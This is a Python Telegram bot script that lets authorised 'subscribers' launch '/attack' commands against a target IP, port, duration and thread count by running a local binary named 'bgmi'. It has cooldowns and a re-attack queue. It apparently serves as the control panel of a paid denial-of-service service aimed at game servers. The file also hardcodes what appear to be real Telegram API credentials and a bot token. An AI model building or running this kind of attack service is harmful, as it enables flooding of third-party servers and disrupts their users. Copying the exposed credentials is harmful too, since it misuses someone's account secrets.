import logging
import asyncio
from telethon import TelegramClient, events
from datetime import datetime, timedelta

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# API credentials from Telegram
api_id = '2991540'
api_hash = 'e7f5969accf95bd9dea772e56e495bce'
bot_token = '7380371428:AAFhHwa6AXO9cBjHydpq38pG_-pONzrR-Zg'

# List of allowed user IDs
allowed_user_ids = ["6682104026", "1048241028"]  # Add your subscribers' Telegram user IDs here

# Initialize the Telegram client
client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# Dictionary to track ongoing attacks and cooldowns
user_attack_status = {}

# Define a command handler for the start command
@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome_message = "Welcome, thanks for using our bot service! Type /attack to start further."
    await event.respond(welcome_message)

# Define a command handler for the attack command
@client.on(events.NewMessage(pattern='/attack'))
async def attack(event):
    user_id = str(event.sender_id)

    # Check if the user is allowed to use the bot
    if user_id not in allowed_user_ids:
        await event.respond("Sorry, you are not authorized to use this bot.")
        return
    
    current_time = datetime.now()

    # Check if the user has an ongoing attack
    if user_id in user_attack_status:
        attack_status = user_attack_status[user_id]
        
        # Check for ongoing attack
        if attack_status['ongoing']:
            await event.respond("Your attack is currently running, kindly wait until it completes.")
            return
        
        # Check if the user has done two attacks back-to-back
        if attack_status['attack_count'] >= 2:
            if current_time < attack_status['cooldown_until']:
                cooldown_remaining = (attack_status['cooldown_until'] - current_time).seconds
                await event.respond(f"Please wait {cooldown_remaining} seconds before initiating another attack. Use /rattack to force re-attack.")
                return
    
    asyncio.create_task(handle_attack(event, user_id, increase_attack_count=True))

@client.on(events.NewMessage(pattern='/rattack'))
async def rattack(event):
    user_id = str(event.sender_id)

    # Check if the user is allowed to use the bot
    if user_id not in allowed_user_ids:
        await event.respond("Sorry, you are not authorized to use this bot.")
        return
    
    current_time = datetime.now()
    
    # Check if the user has an ongoing attack
    if user_id in user_attack_status:
        attack_status = user_attack_status[user_id]
        
        # Check for ongoing attack
        if attack_status['ongoing']:
            await event.respond("Your re-attack request has been queued and will be processed automatically.")
            attack_status['queue'].append((event, True, True))
            return
        
        # Check if the cooldown period for /rattack is over
        if attack_status['rattack_cooldown_until'] and current_time < attack_status['rattack_cooldown_until']:
            rattack_cooldown_remaining = (attack_status['rattack_cooldown_until'] - current_time).seconds
            await event.respond(f"Please wait {rattack_cooldown_remaining} seconds before initiating another re-attack.")
            return

    await event.respond("Only use it if you got stuck on match server timed out error.")
    asyncio.create_task(handle_attack(event, user_id, ignore_cooldown=True, is_rattack=True))

async def handle_attack(event, user_id, ignore_cooldown=False, is_rattack=False, increase_attack_count=False):
    args = event.message.message.split()[1:]
    if len(args) != 4:
        await event.respond("Usage: /attack <Target> <Port> <Time(s)> <Threads>")
        return

    target, port, time, threads = args
    await event.respond("Successfully initiated the attack!")

    # Track the attack status
    if user_id not in user_attack_status:
        user_attack_status[user_id] = {
            'ongoing': False,
            'process': None,
            'cooldown_until': None,
            'attack_count': 0,
            'rattack_cooldown_until': None,
            'queue': []
        }

    attack_status = user_attack_status[user_id]
    attack_status['ongoing'] = True

    # Assuming 'bgmi' is in the same directory as bot.py
    command = f"./bgmi {target} {port} {time} {threads}"
    logger.info(f"Executing command: {command}")

    try:
        process = await asyncio.create_subprocess_exec(
            *command.split(),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        attack_status['process'] = process
        
        stdout, stderr = await process.communicate()

        output = stdout.decode('utf-8').strip()
        error = stderr.decode('utf-8').strip()

        if output:
            await event.respond(output)
        if error:
            await event.respond(f"Error: {error}")
        
        await event.respond("Attack has been completed!")
    except Exception as e:
        logger.error(f"Error during subprocess execution: {e}")
        await event.respond(f"An error occurred: {str(e)}")
    finally:
        attack_status['ongoing'] = False
        attack_status['process'] = None

        if is_rattack:
            attack_status['rattack_cooldown_until'] = datetime.now() + timedelta(seconds=60)
        elif increase_attack_count:
            attack_status['attack_count'] += 1
            if attack_status['attack_count'] >= 2:
                attack_status['cooldown_until'] = datetime.now() + timedelta(seconds=30)
        else:
            attack_status['attack_count'] = 0

        # Process the next attack in the queue if any
        if attack_status['queue']:
            next_event, next_ignore_cooldown, next_is_rattack = attack_status['queue'].pop(0)
            asyncio.create_task(handle_attack(next_event, user_id, ignore_cooldown=next_ignore_cooldown, is_rattack=next_is_rattack, increase_attack_count=increase_attack_count))

def main():
    client.run_until_disconnected()

if __name__ == '__main__':
    main()
